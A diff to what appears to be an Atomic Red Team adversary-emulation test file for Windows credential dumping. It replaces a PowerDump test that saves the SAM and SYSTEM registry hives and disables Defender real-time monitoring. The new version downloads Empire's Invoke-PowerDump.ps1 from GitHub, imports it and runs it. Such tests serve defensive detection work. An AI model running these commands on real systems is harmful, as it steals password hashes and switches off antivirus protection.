@@ -79,34 +79,17 @@ atomic_tests:
     name: command_prompt
     elevation_required: true
     
-- name: PowerDump to parse SAM and SYSTEM files for hashes and usernames
-  description: Use PowerDump to parse SAM and SYSTEM files for hashes and usernames
+- name: PowerDump Registry dump of SAM for hashes and usernames
+  description: This will dump the Registry in memory
   supported_platforms:
   - windows
-  dependency_executor_name: powershell
-  dependencies:
-  - description: Are the files in temp called SAM and SYSTEM
-    prereq_command: |-
-      if (Test-Path $Env:Temp\sam) {exit 0} else {exit 1}
-      if (Test-Path $Env:Temp\system) {exit 0} else {exit 1}
-    get_prereq_command: |-
-      Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
-      Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
-      Set-MpPreference -DisableRealtimeMonitoring $true
-      Write-Host "STARTING TO SAVE SAM AND SYSTEM FROM REGISTRY" -fore green
-      reg save HKLM\sam $Env:Temp\sam
-      reg save HKLM\system $Env:Temp\system
   executor:
     command: |-
+      Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
+      Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
       Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
       Import-Module .\PowerDump.ps1
-      Invoke-PowerDump $Env:Temp\system $Env:Temp\system
-    cleanup_command: |-
-      Write-Host "DELETING ALL FILES that were downloaded earlier" -fore green
-      remove-item $env:TEMP\system
-      remove-item $env:TEMP\sam
-      Write-Host "TURN ON DEFENDER REALTIME MONITORING" -fore green
-      Set-MpPreference -DisableRealtimeMonitoring $false
+      Invoke-PowerDump
     name: powershell
     elevation_required: true
   
